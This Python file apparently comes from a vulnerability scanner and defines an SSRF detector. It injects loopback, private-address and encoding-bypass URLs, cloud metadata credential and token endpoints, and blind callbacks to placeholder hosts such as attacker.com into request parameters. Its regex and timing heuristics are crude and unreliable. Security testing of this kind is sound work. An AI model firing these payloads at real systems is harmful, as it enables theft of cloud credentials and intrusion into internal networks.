"""
Server-Side Request Forgery (SSRF) detector for SPECTR vulnerability scanner
"""

import time
from typing import Dict, List, Any, Optional
from utils.http_client import HTTPClient
from core.payloads import PayloadDatabase
from core.analyzer import ResponseAnalyzer

class SSRFDetector:
    """Server-Side Request Forgery vulnerability detector"""
    
    def __init__(self, http_client: HTTPClient, payloads: PayloadDatabase):
        self.http_client = http_client
        self.payloads = payloads
        self.analyzer = ResponseAnalyzer()
        
        # SSRF indicators
        self.ssrf_patterns = [
            # Internal services
            r'apache.*server',
            r'nginx.*server',
            r'iis.*server',
            r'server.*error',
            r'connection.*refused',
            r'connection.*timeout',
            r'host.*unreachable',
            r'could.*not.*connect',
            r'failed.*to.*connect',
            r'network.*unreachable',
            
            # Cloud metadata
            r'ami-[a-z0-9]+',           # AWS AMI ID
            r'instance-id',             # AWS instance ID
            r'instance-type',           # AWS instance type
            r'local-ipv4',              # AWS local IP
            r'public-ipv4',             # AWS public IP
            r'security-groups',         # AWS security groups
            r'user-data',               # AWS user data
            r'iam/security-credentials', # AWS IAM credentials
            
            # Internal ports/services
            r'ssh.*protocol',
            r'http.*server',
            r'mysql.*server',
            r'postgresql.*server',
            r'redis.*server',
            r'mongodb.*server',
            r'elasticsearch.*server',
            r'jenkins.*server',
            r'consul.*server',
            r'etcd.*server',
            r'kubernetes.*api',
            
            # Error messages
            r'curl.*error',
            r'wget.*error',
            r'http.*request.*failed',
            r'url.*not.*found',
            r'invalid.*url',
            r'malformed.*url',
            r'connection.*timed.*out',
            r'no.*route.*to.*host',
            r'name.*resolution.*failed',
            r'dns.*resolution.*failed',
        ]
    
    def scan(self, url: str, method: str, params: Dict[str, Any], 
             headers: Optional[Dict[str, str]] = None, verbose: bool = False) -> List[Dict[str, Any]]:
        """Scan for SSRF vulnerabilities"""
        
        results = []
        
        if not params:
            if verbose:
                print("   ℹ️  No parameters to test for SSRF")
            return results
        
        # Get baseline response for comparison
        baseline_response = self.http_client.get_baseline_response(
            url=url, method=method, params=params, headers=headers, verbose=verbose
        )
        
        if not baseline_response:
            if verbose:
                print("   ❌ Could not get baseline response")
            return results
        
        # Test each parameter
        for param_name, param_value in params.items():
            if verbose:
                print(f"   🔍 Testing parameter '{param_name}' for SSRF")
            
            # Test internal network SSRF
            internal_results = self._test_internal_ssrf(
                url, method, params, param_name, headers, verbose
            )
            results.extend(internal_results)
            
            # Test cloud metadata SSRF
            cloud_results = self._test_cloud_metadata_ssrf(
                url, method, params, param_name, headers, verbose
            )
            results.extend(cloud_results)
            
            # Test port scanning SSRF
            port_results = self._test_port_scanning_ssrf(
                url, method, params, param_name, headers, verbose
            )
            results.extend(port_results)
            
            # Test blind SSRF
            blind_results = self._test_blind_ssrf(
                url, method, params, param_name, headers, verbose
            )
            results.extend(blind_results)
        
        if verbose and results:
            print(f"   ✅ Found {len(results)} potential SSRF vulnerabilities")
        
        return results
    
    def _test_internal_ssrf(self, url: str, method: str, params: Dict[str, Any], 
                           param_name: str, headers: Optional[Dict[str, str]] = None, 
                           verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for internal network SSRF"""
        
        results = []
        
        # Internal network payloads
        internal_payloads = [
            # Local loopback
            "http://127.0.0.1/",
            "http://localhost/",
            "http://0.0.0.0/",
            "http://[::1]/",
            "http://0000:0000:0000:0000:0000:0000:0000:0001/",
            
            # Private IP ranges
            "http://192.168.1.1/",
            "http://192.168.0.1/",
            "http://10.0.0.1/",
            "http://172.16.0.1/",
            "http://172.31.0.1/",
            
            # Different ports
            "http://127.0.0.1:80/",
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:8000/",
            "http://127.0.0.1:3000/",
            "http://127.0.0.1:5000/",
            "http://127.0.0.1:9000/",
            "http://127.0.0.1:22/",
            "http://127.0.0.1:21/",
            "http://127.0.0.1:3306/",
            "http://127.0.0.1:5432/",
            "http://127.0.0.1:6379/",
            "http://127.0.0.1:27017/",
            "http://127.0.0.1:9200/",
            "http://127.0.0.1:8500/",
            "http://127.0.0.1:2379/",
            "http://127.0.0.1:6443/",
            
            # Different protocols
            "ftp://127.0.0.1/",
            "sftp://127.0.0.1/",
            "ssh://127.0.0.1/",
            "telnet://127.0.0.1/",
            "ldap://127.0.0.1/",
            "ldaps://127.0.0.1/",
            "redis://127.0.0.1/",
            "mysql://127.0.0.1/",
            "postgresql://127.0.0.1/",
            "mongodb://127.0.0.1/",
            
            # URL encoding bypass
            "http://127.0.0.1/",
            "http://0x7f.0x0.0x0.0x1/",
            "http://0177.0.0.1/",
            "http://2130706433/",
            "http://017700000001/",
            "http://0x7f000001/",
            
            # IPv6 bypass
            "http://[::ffff:127.0.0.1]/",
            "http://[0:0:0:0:0:ffff:127.0.0.1]/",
            "http://[::ffff:7f00:1]/",
            
            # Domain bypass
            "http://localtest.me/",
            "http://127.0.0.1.xip.io/",
            "http://127.0.0.1.nip.io/",
            "http://127.0.0.1.sslip.io/",
            
            # URL fragments
            "http://evil.com#127.0.0.1/",
            "http://evil.com@127.0.0.1/",
            "http://127.0.0.1#evil.com/",
            "http://127.0.0.1@evil.com/",
        ]
        
        for payload in internal_payloads:
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                content = response.get('content', '').lower()
                status_code = response.get('status_code', 0)
                response_time = response.get('response_time', 0)
                
                # Check for SSRF indicators
                for pattern in self.ssrf_patterns:
                    import re
                    if re.search(pattern, content, re.IGNORECASE):
                        results.append({
                            'type': 'ssrf',
                            'parameter': param_name,
                            'payload': payload,
                            'method': 'internal_network',
                            'evidence': f"Internal network access pattern: {pattern}",
                            'response_code': status_code,
                            'response_time': response_time
                        })
                        
                        if verbose:
                            print(f"   🔴 Internal SSRF found: {pattern}")
                        break
                
                # Check for different response patterns
                if status_code in [200, 302, 403, 500, 502, 503, 504]:
                    # Different status codes might indicate internal service access
                    if response_time > 5:  # Long response time might indicate internal processing
                        results.append({
                            'type': 'ssrf',
                            'parameter': param_name,
                            'payload': payload,
                            'method': 'timing_based',
                            'evidence': f"Long response time suggests internal request: {response_time}s",
                            'response_code': status_code,
                            'response_time': response_time
                        })
                        
                        if verbose:
                            print(f"   🔴 Timing-based SSRF found: {response_time}s")
        
        return results
    
    def _test_cloud_metadata_ssrf(self, url: str, method: str, params: Dict[str, Any], 
                                 param_name: str, headers: Optional[Dict[str, str]] = None, 
                                 verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for cloud metadata SSRF"""
        
        results = []
        
        # Cloud metadata payloads
        cloud_payloads = [
            # AWS metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/meta-data/instance-type",
            "http://169.254.169.254/latest/meta-data/local-ipv4",
            "http://169.254.169.254/latest/meta-data/public-ipv4",
            "http://169.254.169.254/latest/meta-data/security-groups",
            "http://169.254.169.254/latest/meta-data/ami-id",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/meta-data/placement/availability-zone",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            
            # Google Cloud metadata
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/instance/name",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "http://metadata.google.internal/computeMetadata/v1/instance/zone",
            "http://metadata.google.internal/computeMetadata/v1/instance/machine-type",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
            "http://metadata.google.internal/computeMetadata/v1/project/",
            
            # Azure metadata
            "http://169.254.169.254/metadata/instance?api-version=2017-08-01",
            "http://169.254.169.254/metadata/instance/compute?api-version=2017-08-01",
            "http://169.254.169.254/metadata/instance/network?api-version=2017-08-01",
            "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2017-08-01",
            "http://169.254.169.254/metadata/instance/compute/name?api-version=2017-08-01",
            "http://169.254.169.254/metadata/instance/compute/location?api-version=2017-08-01",
            "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2017-08-01",
            "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2017-08-01",
            "http://169.254.169.254/metadata/instance/compute/vmSize?api-version=2017-08-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            
            # Digital Ocean metadata
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1/id",
            "http://169.254.169.254/metadata/v1/hostname",
            "http://169.254.169.254/metadata/v1/region",
            "http://169.254.169.254/metadata/v1/interfaces/",
            "http://169.254.169.254/metadata/v1/interfaces/public/",
            "http://169.254.169.254/metadata/v1/interfaces/private/",
            "http://169.254.169.254/metadata/v1/dns/",
            "http://169.254.169.254/metadata/v1/tags/",
            "http://169.254.169.254/metadata/v1/user-data",
            
            # Alibaba Cloud metadata
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/instance-id",
            "http://100.100.100.200/latest/meta-data/instance-type",
            "http://100.100.100.200/latest/meta-data/private-ipv4",
            "http://100.100.100.200/latest/meta-data/public-ipv4",
            "http://100.100.100.200/latest/meta-data/hostname",
            "http://100.100.100.200/latest/meta-data/zone-id",
            "http://100.100.100.200/latest/meta-data/region-id",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
            "http://100.100.100.200/latest/user-data",
        ]
        
        for payload in cloud_payloads:
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                content = response.get('content', '').lower()
                status_code = response.get('status_code', 0)
                
                # Check for cloud metadata patterns
                for pattern in self.ssrf_patterns:
                    import re
                    if re.search(pattern, content, re.IGNORECASE):
                        results.append({
                            'type': 'ssrf',
                            'parameter': param_name,
                            'payload': payload,
                            'method': 'cloud_metadata',
                            'evidence': f"Cloud metadata access pattern: {pattern}",
                            'response_code': status_code,
                            'response_time': response.get('response_time', 0)
                        })
                        
                        if verbose:
                            print(f"   🔴 Cloud metadata SSRF found: {pattern}")
                        break
                
                # Check for specific cloud metadata content
                if any(indicator in content for indicator in ['ami-', 'instance-id', 'instance-type', 'security-credentials', 'computemetadata', 'metadata']):
                    results.append({
                        'type': 'ssrf',
                        'parameter': param_name,
                        'payload': payload,
                        'method': 'cloud_metadata',
                        'evidence': f"Cloud metadata content detected in response",
                        'response_code': status_code,
                        'response_time': response.get('response_time', 0)
                    })
                    
                    if verbose:
                        print(f"   🔴 Cloud metadata SSRF found: metadata content in response")
        
        return results
    
    def _test_port_scanning_ssrf(self, url: str, method: str, params: Dict[str, Any], 
                                param_name: str, headers: Optional[Dict[str, str]] = None, 
                                verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for port scanning via SSRF"""
        
        results = []
        
        # Common ports to test
        common_ports = [22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 1433, 1521, 3306, 3389, 5432, 5984, 6379, 8080, 8443, 9200, 27017]
        
        for port in common_ports[:5]:  # Test first 5 ports to avoid too many requests
            payload = f"http://127.0.0.1:{port}/"
            
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                content = response.get('content', '').lower()
                status_code = response.get('status_code', 0)
                response_time = response.get('response_time', 0)
                
                # Different response times might indicate port status
                if response_time > 1:  # Longer response might indicate open port
                    results.append({
                        'type': 'ssrf',
                        'parameter': param_name,
                        'payload': payload,
                        'method': 'port_scanning',
                        'evidence': f"Port {port} might be open (response time: {response_time}s)",
                        'response_code': status_code,
                        'response_time': response_time
                    })
                    
                    if verbose:
                        print(f"   🔴 Port scanning SSRF found: port {port} response time {response_time}s")
        
        return results
    
    def _test_blind_ssrf(self, url: str, method: str, params: Dict[str, Any], 
                        param_name: str, headers: Optional[Dict[str, str]] = None, 
                        verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for blind SSRF vulnerabilities"""
        
        results = []
        
        # Blind SSRF payloads (out-of-band)
        blind_payloads = [
            "http://ssrf.burpcollaborator.net/",
            "http://ssrf.dnslog.cn/",
            "http://requestbin.fullcontact.com/",
            "http://httpbin.org/get",
            "http://postman-echo.com/get",
            "http://webhook.site/unique-id",
            "http://attacker.com/ssrf-test",
            "https://attacker.com/ssrf-test",
            "ftp://attacker.com/ssrf-test",
            "ldap://attacker.com/ssrf-test",
            "redis://attacker.com/ssrf-test",
            "mysql://attacker.com/ssrf-test",
            "postgresql://attacker.com/ssrf-test",
            "mongodb://attacker.com/ssrf-test",
        ]
        
        for payload in blind_payloads:
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                status_code = response.get('status_code', 0)
                response_time = response.get('response_time', 0)
                
                # For blind SSRF, check response patterns
                if status_code == 200 and response_time > 2:
                    results.append({
                        'type': 'ssrf',
                        'parameter': param_name,
                        'payload': payload,
                        'method': 'blind_ssrf',
                        'evidence': f"Potential blind SSRF - check out-of-band logs",
                        'response_code': status_code,
                        'response_time': response_time
                    })
                    
                    if verbose:
                        print(f"   🔴 Potential blind SSRF found - verify with out-of-band logs")
        
        return results